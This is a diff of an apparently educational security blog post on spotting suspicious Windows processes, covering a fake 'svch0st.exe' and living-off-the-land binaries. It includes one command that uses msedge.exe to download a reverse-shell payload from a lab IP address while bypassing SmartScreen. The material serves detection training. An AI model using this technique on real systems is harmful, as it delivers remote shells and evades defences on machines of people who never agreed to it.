@@ -27,7 +27,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "\/posts\/suspiciousprocessactivity\/suspicious-process-activity\/"
-        },"genre": "posts","keywords": "Fundamental","wordcount":  51 ,
+        },"genre": "posts","keywords": "Fundamental","wordcount":  212 ,
         "url": "\/posts\/suspiciousprocessactivity\/suspicious-process-activity\/","datePublished": "2024-05-09T00:00:00+00:00","dateModified": "2024-05-09T00:00:00+00:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -69,7 +69,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Suspicious Process Activity</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://github.com/tryhardnguyen" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Nguyen Nguyen</a></span>&nbsp;<span class="post-category">included in <a href="/categories/fundamental/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Fundamental</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-05-09">2024-05-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;51 words&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-05-09">2024-05-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;212 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;One minute&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
@@ -130,7 +130,58 @@ For example: svch0st.exe vs svchost.exe
         <img class="zoomed-image" src="/images/SuspiciousProcessActivity/hideInPlainSight.png">
 </div>
 <br>
+Original svchost.exe:
+<br>
+<img class="zoom" src="/images/SuspiciousProcessActivity/original_svchost.png">
+<div class="overlay">
+        <img class="zoomed-image" src="/images/SuspiciousProcessActivity/original_svchost.png">
+</div>
+<br>
+Original svchost.exe:
+<br>
+<img class="zoom" src="/images/SuspiciousProcessActivity/original_svchost.png">
+<div class="overlay">
+        <img class="zoomed-image" src="/images/SuspiciousProcessActivity/original_svchost.png">
+</div>
+<br>
+Our fake: svchost.exe
+<br>
+<img class="zoom" src="/images/SuspiciousProcessActivity/svch0st.exe.png">
+<div class="overlay">
+        <img class="zoomed-image" src="/images/SuspiciousProcessActivity/svch0st.exe.png">
+</div>
+<br>
+As you can see from the picture above, there are some information or section that we can use to identify a legitimate process vs a malicious process. For instance, the parent section, Image file name, number of instance of the process, and the status of it being unverified can help.
+<br>
+<br>
+Here is the normal information for svchost.exe:
+<br>
+Process Name: svchost.exe
+File Path: %systemroot%\\System32\\svchost.exe
+Parent Process: services.exe
+Number of instance: More than 1
+<br>
+One tool that is helpful to learn a binary "normal behavior" is EchoTrail.
+<br>
+Link: https://www.echotrail.io/
 <h3 id="living-off-the-land-binaries-lolbas">Living off the Land Binaries (LOLBAS)</h3>
+<p>Using the built in windows binary that are within the system to carry out malicious actions.
+<br>
+Reference: <a href="https://lolbas-project.github.io/#" target="_blank" rel="noopener noreffer ">https://lolbas-project.github.io/#</a>
+<br>
+In this example, we are going to use msedge.exe to download an reverse shell and spawn a command shell to execute an command.
+<br>
+With smart screen:
+<br>
+<img class="zoom" src="/images/SuspiciousProcessActivity/svch0st.exe.png"></p>
+<div class="overlay">
+        <img class="zoomed-image" src="/images/SuspiciousProcessActivity/svch0st.exe.png">
+</div>
+<br>
+The picture show that microsoft edge is being used to download a reverse_shell (svch0st.exe.txt). This method avoid the smart screen.
+<br>
+Command: `msedge.exe  http://192.168.109.6:9000/svch0st.exe.txt`
+<br>
 <h3 id="suspicious-parent-child-relationship">Suspicious Parent-Child Relationship</h3>
 <h3 id="suspicious-binaries-path">Suspicious Binaries Path</h3>
 <!-- Zoom Animation Feature -->
